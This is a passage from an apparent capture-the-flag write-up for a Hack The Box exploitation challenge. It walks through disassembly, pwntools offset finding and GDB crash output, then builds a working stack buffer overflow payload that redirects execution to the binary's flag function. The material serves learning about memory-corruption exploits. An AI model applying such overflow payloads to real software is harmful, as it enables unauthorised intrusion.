 804920d:       89 45 f4                mov    %eax,-0xc&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%ebp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 8049210:       83 7d f4 00             cmpl   &lt;span class=&quot;nv&quot;&gt;$0x0&lt;/span&gt;,-0xc&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%ebp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 8049214:       75 1c                   jne    8049232 &amp;lt;flag+0x50&amp;gt;
 8049216:       83 ec 0c                sub    &lt;span class=&quot;nv&quot;&gt;$0xc&lt;/span&gt;,%esp
 8049219:       8d 83 14 e0 ff ff         lea    &lt;span class=&quot;nt&quot;&gt;-0x1fec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%ebx&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,%eax
 804921f:       50                      push   %eax
 8049220:       e8 4b fe ff ff            call   8049070 &amp;lt;puts@plt&amp;gt;

 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...snip...]
 8049232:       83 ec 04                sub    &lt;span class=&quot;nv&quot;&gt;$0x4&lt;/span&gt;,%esp
 8049235:       ff 75 f4                 push   &lt;span class=&quot;nt&quot;&gt;-0xc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%ebp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 8049238:       6a 40                   push   &lt;span class=&quot;nv&quot;&gt;$0x40&lt;/span&gt;
 804923a:       8d 45 b4                lea    &lt;span class=&quot;nt&quot;&gt;-0x4c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%ebp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,%eax
 804923d:       50                      push   %eax
 804923e:       e8 0d fe ff ff            call   8049050 &amp;lt;fgets@plt&amp;gt;
 8049243:       83 c4 10                add    &lt;span class=&quot;nv&quot;&gt;$0x10&lt;/span&gt;,%esp
 8049246:       81 7d 08 ef be ad de    cmpl   &lt;span class=&quot;nv&quot;&gt;$0xdeadbeef&lt;/span&gt;,0x8&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%ebp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 804924d:       75 1a                   jne    8049269 &amp;lt;flag+0x87&amp;gt;
 804924f:       81 7d 0c 0d d0 de c0    cmpl   &lt;span class=&quot;nv&quot;&gt;$0xc0ded00d&lt;/span&gt;,0xc&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%ebp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 8049256:       75 14                   jne    804926c &amp;lt;flag+0x8a&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We get to call the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fopen&lt;/code&gt; fucntion, which is seemingly openning a text file and reading its contents. Then, at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x08049214&lt;/code&gt; we are jumping to the next part of the code, if openning the file was successful. Within the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmpl&lt;/code&gt; instructions, we are comparing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$0xdeadbeef&lt;/code&gt; with whatever is stored in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x8(%ebp)&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$0xc0ded00d&lt;/code&gt; with what is stored in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xc(%ebp)&lt;/code&gt;. If they match, then we continue to this:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...snip...]
8049258:       83 ec 0c                sub    &lt;span class=&quot;nv&quot;&gt;$0xc&lt;/span&gt;,%esp
804925b:       8d 45 b4                lea    &lt;span class=&quot;nt&quot;&gt;-0x4c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%ebp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,%eax
804925e:       50                      push   %eax
804925f:       e8 cc fd ff ff            call   8049030 &amp;lt;&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt;@plt&amp;gt;
8049264:       83 c4 10                add    &lt;span class=&quot;nv&quot;&gt;$0x10&lt;/span&gt;,%esp
8049267:       eb 04                   jmp    804926d &amp;lt;flag+0x8b&amp;gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...snip...]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;which prints the contents of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fopen&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&quot;step-3---crafting-the-attack&quot;&gt;&lt;a href=&quot;#mindset-step3&quot;&gt;&lt;/a&gt;Step 3 - Crafting the attack&lt;/h2&gt;

&lt;p&gt;To have this to work, we need to find the exact offset to which we overflow the buffer and inject a call to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag&lt;/code&gt; function. To calculate the offset, we can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pwntools&lt;/code&gt; in Python and create a cycled input. This will calculate a rough estimate of how many bytes we need to overflow and inject a call. A simple Python script should do the job:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cyclic&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;pattern&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;cyclic&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;300&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pattern&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Let’s create a file with this as a payload to be passed to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vuln&lt;/code&gt; executable. We can run:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;htb-venv&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; kaizen@celestial /tmp/htb &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 cycle.py &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; cycle.txt
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;htb-venv&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; kaizen@celestial /tmp/htb &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;cycle.txt 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now, we  need to pass this as a payload to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vuln&lt;/code&gt; executable and examine at what address the program crashes. To help us with that, we will use GDB: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gdb ./vuln&lt;/code&gt;. Once inside, we run with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r &amp;lt; cycle.txt&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; r &amp;lt; cycle.txt
Starting program: /tmp/htb/vuln &amp;lt; cycle.txt
Downloading separate debug info &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;system-supplied DSO at 0xf7fc7000                  
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Thread debugging using libthread_db enabled]                                          
Using host libthread_db library &lt;span class=&quot;s2&quot;&gt;&quot;/usr/lib/libthread_db.so.1&quot;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
You know &lt;span class=&quot;nb&quot;&gt;who &lt;/span&gt;are 0xDiablos: 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac

Program received signal SIGSEGV, Segmentation fault.
0x62616177 &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; ?? &lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ok, the stack crashed at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x62616177&lt;/code&gt;. Now, we can calculate the offset by giving this address to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pwntools&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cyclic_find&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;eip_value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x61776261&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;cyclic_find&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;eip_value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;The offset: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Gives:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;htb-venv&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; kaizen@celestial /tmp/htb &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 offset.py 
The offset: 186
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So the offset is roughly 186. I say roughly, because this method does not always work, but it always gives a rough estimate. Now it’s time to investigate it further with GDB. Let’s try to see if we can delivery a payload with this offset and containing the address of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag&lt;/code&gt; function to be called. We could start with this payload &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python3 -c &quot;import sys; sys.stdout.buffer.write(b&apos;A&apos;*186 + &amp;lt;flag function address&amp;gt;)&quot;&lt;/code&gt;, where in this case, the function address is: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x080491e2&lt;/code&gt;. Since we are in a little-endian system, we write the payload as follows:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;186&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;A&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xe2\x91\x04\x08&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Let’s write the output to a binary file:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;htb-venv&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; kaizen@celestial /tmp/htb &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;import sys; sys.stdout.buffer.write(b&apos;A&apos;*186 + b&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e2&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;91&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;08&apos;)&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; payload.bin
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now, with GDB, we can analyze if the offset is correct:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; r &amp;lt; payload.bin
Starting program: /tmp/htb/vuln &amp;lt; payload.bin
Downloading separate debug info &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;system-supplied DSO at 0xf7fc7000                  
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Thread debugging using libthread_db enabled]                                          
Using host libthread_db library &lt;span class=&quot;s2&quot;&gt;&quot;/usr/lib/libthread_db.so.1&quot;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
You know &lt;span class=&quot;nb&quot;&gt;who &lt;/span&gt;are 0xDiablos: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��

Program received signal SIGSEGV, Segmentation fault.
0x08000804 &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; ?? &lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Note that the program crashed at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x08000804&lt;/code&gt;. This suggests that the return address might not have been overwritten with the correct address; that is, our offset is wrong. With an offset of 187, we get the same, but now in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x00080491&lt;/code&gt; address. As we can see, slowly our payload is being overwritten in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$eip&lt;/code&gt; register. With 188 we get a segmentation fault at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xdeadbeef&lt;/code&gt;, and with 189 we get it at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x91e24141&lt;/code&gt;. This indicates the correct offset is 188, since the crash at 0xdeadbeef with this offset confirms that the exact location of the return address on the stack is being targeted. The return address is overwritten with the bytes from our payload and calling the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag&lt;/code&gt; function.&lt;/p&gt;

&lt;p&gt;Also, this is what we get when we pass the payload to the executable with an offset of 188:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;htb-venv&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; kaizen@celestial /tmp/htb &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;import sys; sys.stdout.buffer.write(b&apos;A&apos;*188 + b&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e2&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;91&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;08&apos;)&quot;&lt;/span&gt; | ./vuln
You know &lt;span class=&quot;nb&quot;&gt;who &lt;/span&gt;are 0xDiablos: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��
Hurry up and try &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;on server side.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;Hurry up and try in on server side.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;This seems a message that is being displayed at the flag function. Let’s check it with GDB:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; b flag
Breakpoint 1 at 0x80491e6
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; r &amp;lt; payload.bin
Starting program: /tmp/htb/vuln &amp;lt; payload.bin
Downloading separate debug info &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;system-supplied DSO at 0xf7fc7000                  
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Thread debugging using libthread_db enabled]                                          
Using host libthread_db library &lt;span class=&quot;s2&quot;&gt;&quot;/usr/lib/libthread_db.so.1&quot;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
You know &lt;span class=&quot;nb&quot;&gt;who &lt;/span&gt;are 0xDiablos: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��

Breakpoint 1, 0x080491e6 &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;flag &lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Aha! As expected, we are reaching the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag&lt;/code&gt; function now! It is just a matter of adjusting our payload now to successfully printing the contents of the file openned with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fopen&lt;/code&gt;. Let’s use GDB to investigate the flow of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag&lt;/code&gt; function:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...snip...]
0x08049205 &amp;lt;+35&amp;gt;:    call   0x80490b0 &amp;lt;fopen@plt&amp;gt;
0x0804920a &amp;lt;+40&amp;gt;:    add    &lt;span class=&quot;nv&quot;&gt;$0x10&lt;/span&gt;,%esp
0x0804920d &amp;lt;+43&amp;gt;:    mov    %eax,-0xc&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%ebp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
0x08049210 &amp;lt;+46&amp;gt;:    cmpl   &lt;span class=&quot;nv&quot;&gt;$0x0&lt;/span&gt;,-0xc&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%ebp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
0x08049214 &amp;lt;+50&amp;gt;:    jne    0x8049232 &amp;lt;flag+80&amp;gt;
0x08049216 &amp;lt;+52&amp;gt;:    sub    &lt;span class=&quot;nv&quot;&gt;$0xc&lt;/span&gt;,%esp
0x08049219 &amp;lt;+55&amp;gt;:    lea    &lt;span class=&quot;nt&quot;&gt;-0x1fec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%ebx&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,%eax
0x0804921f &amp;lt;+61&amp;gt;:    push   %eax
0x08049220 &amp;lt;+62&amp;gt;:    call   0x8049070 &amp;lt;puts@plt&amp;gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...snip...]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Note that we are comparing the contents of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%ebp&lt;/code&gt; stack with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x0&lt;/code&gt;, which is C equivalent to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NULL&lt;/code&gt;. If the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmpl&lt;/code&gt; returns true, we do not jump with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jne&lt;/code&gt; and we get the message “Hurry up and try in on server side.” through the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;puts@plt&lt;/code&gt; function. This happens because there is no text file to be openned in our local machine.&lt;/p&gt;

&lt;p&gt;Without knowing the name of the file openned by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fopen&lt;/code&gt;, we cannot go further with our analysis locally. One way to enhance our analysis is by using Ghidra. Ghidra is a reverse engineering software that a lot of times rewrites the original code to us from the assembly.&lt;/p&gt;

&lt;p&gt;After running Ghidra, we find the following:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/ghidra-fopen.png&quot; alt=&quot;ghidra&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We see that the file name is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag.txt&lt;/code&gt;. Alright! We can create a flag ourselves and keep testing it locally. Just run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;echo &quot;hi mom&quot; &amp;gt; flag.txt&lt;/code&gt; and go back to GDB!&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; r &amp;lt; payload.bin 
Starting program: /tmp/htb/vuln &amp;lt; payload.bin
Downloading separate debug info &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;system-supplied DSO at 0xf7fc7000                  
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Thread debugging using libthread_db enabled]                                          
Using host libthread_db library &lt;span class=&quot;s2&quot;&gt;&quot;/usr/lib/libthread_db.so.1&quot;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
You know &lt;span class=&quot;nb&quot;&gt;who &lt;/span&gt;are 0xDiablos: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��

Program received signal SIGSEGV, Segmentation fault.
0xffffff00 &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; ?? &lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Note that now we are not getting the message. This is because the program is successfully openning the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag.txt&lt;/code&gt; file and reading its contents. The problem is: it is not printing it for us!&lt;/p&gt;

&lt;p&gt;Looking back at Ghidra, we see this line:&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;[...&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;snip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...]&lt;/span&gt;
